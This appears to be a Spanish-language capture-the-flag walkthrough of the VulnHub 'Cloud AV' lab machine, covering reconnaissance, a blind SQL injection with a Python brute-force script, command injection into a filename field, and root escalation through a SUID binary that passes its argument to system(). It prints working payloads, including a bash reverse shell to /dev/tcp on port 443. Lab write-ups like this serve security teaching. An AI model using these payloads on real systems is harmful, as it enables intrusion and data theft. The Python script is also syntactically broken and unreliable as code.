---
layout: single
title: BOREDHACKERBLOG:CLOUD AV - VulnHub
excerpt: " Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.
Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs.
Difficulty: Easy "
date: 2023-01-23
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-cloudav/cloudav.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - sqli
  - command
  - injection
  - python
  - script
---

Cloud Anti-Virus Scanner! is a cloud-based antivirus scanning service.
Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs.
*Difficulty:* Easy

# Summary
- IP: 192.168.0.234
- Ports: 22, 8080
- OS: Linux (Debian Buster)
- Services & Applications:
	-  22 -> OpenSSH 7.6p1 Ubuntu 4
	-  8080 -> Werkzeug httpd 0.14.1


# Adaptación de VM en Vmware:

- Encendemos la máquina, presionar "ESC" y luego la tecla "E".

- Escribir la siguiente linea en donde corresponde:

```
ro maybyubiquiti    ------>    rw init=/bin/bash  
```

- Presionar "F10"

- Escribir los siguientes comandos en la bash desplegada:

```
$passwd root
$root123
$root123
$nano /etc/ssh/sshd_config
```

- Buscar la linea:

```
#PermitRootLogin
```

- Cambiar a:

```
PermitRootLogin yes
```

- Reiniciar la máquina.

- Iniciar sesión como "root" con la contraseña "root123"

- Asignar una IP en la interface ens33:

```
ifconfig ens33 192.168.0.234 netmask 255.255.255.0 
route add default gw 192.168.0.1
```

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.0.234 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,8080 -sCV 192.168.0.234 -oN targeted
```


# Análisis de página Web:

- Entramos a la web por puerto 8080 y vemos una página simple en la que nos pide ingresar un dato (codigo de invitación)

- Al ingresar cualquier un dato aleatorio, nos lanza un mensaje "WRONG INFORMATION"

- Analizamos la petición con Burpsuite.

- Vemos que se trata de una petición POST que nos redirige a un directorio /login, usamos wfuzz para tratar de encontrar un caracter que responda un mensaje diferente y comprobar que la base de datos que corre por detrás es vulnerable:

```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/special-chars.txt -d "password=FUZZ" 192.168.0.234:8080/login
```

- Comprobamos que el caracter ( " ) devuelve un mensaje diferente en la página, lo ingresamos como dato y vemos un error de SQLite3.

```
OperationalError: unrecognized token: """""
```

- En una linea del error podemos ver lo siguiente:

```
if len(c.execute('select * from code where password="' + password + '"').fetchall()) > 0:
```

- Enumeramos posibles tablas y columnas de la base de datos: code, password.
-  Todo parece indicar que el caracter ( " ) está haciendo conflicto, pues cierra la query antes de que se complete, eso nos invita a intentar realizar un ataque de SQL injection.


# SQL Injection:

- Mandamos la petición al Repeater en burpsuite para hacer todas las pruebas necesarias.

- Vemos que ingresando el dato " or 1=2 nos manda un error 202, diferente a si ingresamos " 1=1; probamos hacer un ataque a ciegas, aprovechando que nos arroja el mensaje "WRONG INFORMATION" al ingresar un dato erroneo, tratando de conseguir credenciales de las tablas anteriormente enumeradas.

- Probamos el ataque a ciegas ingresando los datos:

" or (select 'a')='a'-- -
" or (select 'a')='b'-- -

- Vemos que no se cumple la tautología en el segundo caso.

- Seguimos intentando explotar haciendo la siguiente comprobación:

 or (select substr(password,1,1) from code)='a'-- -
 
- Con esta query estamos comparando de forma booleana si el primer caracter del primer dato de la columna "password" de la tabla "code" sea igual a 'a', lo cual nos arroja el mensaje "WRONG INFORMATION", para probar con todas las letras posibles usamos el Intruder de burpsuite.

- Mandamos la petición al intruder, seleccionamos ataque de tipo"sniper", luego clickeamos en "clear" y seleccionamos solo el caracter 'a' que es donde intentaremos probar todos los caracteres para comprobar que uno arroje un mensaje diferente al "WRONG INFORMATION".

- Le damos en "add"  y en la pestaña "payloads" añadimos todo el abecedario en "payload options".

- Luego en la pestaña "Options" en la parte de "grep-extract" seleccionamos el mensaje "WRONG INFORMATION" .

- Iniciamos el ataque y vemos que la letra "m" nos emite un mensaje diferente al de "WRONG INFORMATION", lo cual nos indica que la query que inyectamos está funcionando de forma correcta.

- Ahora con todo esta información recopilada y testeada, para intentar conseguir información en formato de cadena todos los datos alojados en la columna "password" de la tabla "code" podemos inyectar la siguiente query de forma recursiva probando todas las posibilidades:

##### NOTA: En este caso la base de datos si hace la diferencia entre mayúsculas y minúsculas, en caso de no hacerlo, el formato de la query sería diferente y se tornaría un poco más complejo.

or (select substr(group_concat(password),1,1) from code)='a'-- -

- Para probar cada posibilidad nos creamos una script en python:

```python
#!/usr/bin/python3

from pwn import *
import requests, sys, time, signal, string

def def_handler(sig,frame):
    print ("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Variables globales
main_url = "http://192.168.0.234:8080/login"
characters = string.ascii_lowercase + string.digits + ","

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")
    extracted_info = ""

    for position in range(1,100):
        for character in characters:
            post_data = {
                'password': '''" or (select substr(group_concat(password),%d,1) from code)='%s'-- -''' % (position,character)
            }
            r = requests.post(main_url, data=post_data)
            if "WRONG INFORMATION" not in r.text:
            extracted_info += character
                p2.status(extracted_info)
                break
#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
    makeSQLI(

```

- Ejecutamos la script y nos devuelve algunas credenciales, probamos cualquiera en la página y nos redirige a "/scan":


# Command Injection:

- Aquí vemos un sistema de ficheros al parecer cateado, en el que nos pide escoger un fichero para posteriormente ser analizado; sospechamos que en el campo donde se debe poner el nombre del fichero hay comandos por detrás para que opere el escaneo, así que intentamos hacer inyección de comandos:

```
test; whoami
```

- Vemos que si es vulnerable y aprovechamos para entablar una reverse shell básica:

```
test; bash -c "bash -i >& /dev/tcp/192.168.0.108/443 0>&1"
```

- Accedemos como el usuario "scanner".


# ESCALANDO PRIVILEGIOS:

- Dentro del directorio "/home/scanner" encontramos un archivo con permisos SUID con "root" como propietario, analizamos el presunto backup denominado "update_cloudac.c" y analizamos el código escrito en lenguaje C:

```C
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;

}
```

- Vemos que en el código el programa requiere de un argumento el cual lo ejecutará como "root" con el comando "system", lo cual hace un llamado al sistema, aprovechamos esto para inyectar comandos, ejecutando el programa mandándole un argumento concatenado con un llamado a la bash, la cual se desplegará como root:

```bash
./update_cloudav "test;bash"
```
